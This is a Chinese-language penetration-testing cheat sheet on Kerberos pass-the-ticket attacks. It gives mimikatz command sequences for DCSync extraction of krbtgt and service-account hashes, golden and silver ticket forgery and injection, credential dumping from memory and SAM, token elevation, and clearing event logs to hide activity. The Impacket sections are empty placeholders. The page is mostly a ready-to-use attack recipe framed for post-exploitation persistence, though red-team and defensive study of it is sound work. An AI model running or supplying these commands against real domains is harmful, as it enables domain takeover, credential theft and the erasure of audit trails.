---
description: 适用于在获取目标域内最高权限后的权限维持 / 后渗透密码收集 / 基于Kerberos认证
---

# ✔️ 票据传递攻击 - Pass The Ticket

## 黄金票据传递攻击

### 先决条件

* 已获得了目标域内**krbtgt用户**的哈希值
* 已获得了目标域的SID值
* 目标域名
* 要伪造的域用户（高权限账户：域管理员）

### 工具

#### Impacket

```bash
// Some code
```

#### mimikatz.exe

```powershell
mimikatz.exe
# 提取krbtgt账户的NTLM哈希值 (DCSync攻击常用)
lsadump::dcsync /domain:target.com /user:krbtgt
# 生成黄金票据
kerberos::golden /user:administrator /domain:target.com /sid:域SID /krbtgt:312343xxxxxxxxxxx345435565789 /id:500 /target:target.com /renewal:票据的有效时间 /ticket:golden_ticket.kirbi
# 导入
kerberos::ptt golden_ticket.kirbi
# 验证
kerberos::list
# 持久化：可将生成的票据保存下来，后续继续使用
```

{% hint style="info" %}
* 提取NTLM哈希——生成黄金票据——导入伪造的黄金票据——验证票据——持久化
* 黄金票据可访问全域资源
{% endhint %}

## 白银票据传递攻击

### 先决条件

* 已获得了目标域内**服务账户**的哈希值
* 已获得了目标域的SID值
* 目标域名
* 需要知道SPN
* 要伪造的域用户（高权限账户：域管理员）

### 工具

#### Impacket

```bash
// Some code
```

#### mimikatz.exe

```powershell
mimikatz.exe
# 提取服务账户的NTLM哈希
lsadump::dcsync /domain:target.com /user:服务账户名
# 生成白银票据
kerberos::golden /domain:target.com /sid:域SID /target:server.target.com /service:http /rc4:服务账户哈希 /user:administrator /id:用户RID /ptt
# 验证
kerberos::list
# 使用白银票据，例如访问共享目录
\\server.target.com\sharedfolder
# 有条件的持久化：只要服务账户的哈希没改就可以
```

{% hint style="info" %}
* 提取NTLM哈希——生成白银票据——验证票据——有条件的持久化
* 白银票据在本地使用，不与DC交互，因此比黄金票据攻击要隐蔽
* 是针对特定服务的TGS的攻击
{% endhint %}

## 常用命令

### mimikatz.exe

```powershell
# 列出系统上的所有票据
sekurlsa::tickets /export
# 提升权限
privilege::debug
# 提取当前用户凭证
sekurlsa::logonpasswords
# 提取本地SAM数据库中的NTLM哈希
lsadump::sam
# 列出当前用户的 Kerberos 票据（TGT 和 TGS）
sekurlsa::tickets
# 直接提取列出的票据
sekurlsa::tickets /export
# 列出当前用户的所有令牌
token::list
# 在令牌里发现有高权限的账户后，提升权限
token::elevate
# 清除日志
event::clear
```

### 其他

```bash
# 查域SID
whoami /user
whoami /groups
```

{% hint style="info" %}
Kerberos协议是在位于**不受信任的网络中**的**受信任主机上**的**身份验证**协议，在域渗透的过程中主要是利用Kerberos票据来进行攻击，涉及黄金票据和白银票据传递，票据传递攻击本质上是冒充其他高权限用户。
{% endhint %}
